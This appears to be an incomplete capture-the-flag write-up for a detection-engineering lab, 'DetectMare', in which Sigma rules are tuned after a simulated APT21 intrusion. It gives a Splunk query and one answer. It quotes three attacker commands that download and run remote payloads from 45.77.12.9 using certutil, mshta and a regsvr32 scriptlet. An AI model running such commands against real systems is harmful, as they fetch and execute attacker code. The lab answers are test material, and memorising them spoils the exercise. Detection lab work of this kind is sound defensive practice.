# DetectMare

The first thing to do, is to read the instructions and the briefing.

From the briefing we learn that the attacker was likely APT21 and did not trigger any alerts. 

Jordan Blake from CSIRT team submitted several pull requests (PR) with Sigma Rules. Our job is to tune the Sigma rules in the PRs.

## Exploring tss-dac

A good place to start in the tss-dac, is the incident_report.md file. That file contains the details about the attack.

## Questions

### What is the doc file opened by the infected user?

To solve this question, I looked for a .doc file and the IP address given in the incident_report.md file. 

By using the following query in Splunk, I found the file name we are looking for in the ParentCommandLine. With the file we also got the username of the infected user.

> index="dac_lab" \*.doc\* "<http://45.77.12.9/u.dat>"

Answer: Hypersonic_Test_Schedule_2025.docm

### What is the PR#1 flag?

The incident_report.md file shows us the following commands for PR#1. They are useful to tune the Sigma rule.

> cmd.exe /c certutil -urlcache -split -f http://45.77.12.9/u.dat %TEMP%\u.dat
>
> mshta.exe http://45.77.12.9/cfg.hta
>
> regsvr32.exe /s /n /u /i:http://45.77.12.9/s.sct scrobj.dll

### What is the filename of the internal tool that may cause false positives in PR#2 if not properly filtered?

### What is the PR#2 flag?

### What is the username that the attacker used to execute the LSASS dump?

### What is the PR#3 flag?

### When did the pass-the-hash authentication happen?

### What is the PR#4 flag?

### In which folder should an attacker place a malicious binary to make it look like a legitimate backup routine?

### What is the PR#5 flag?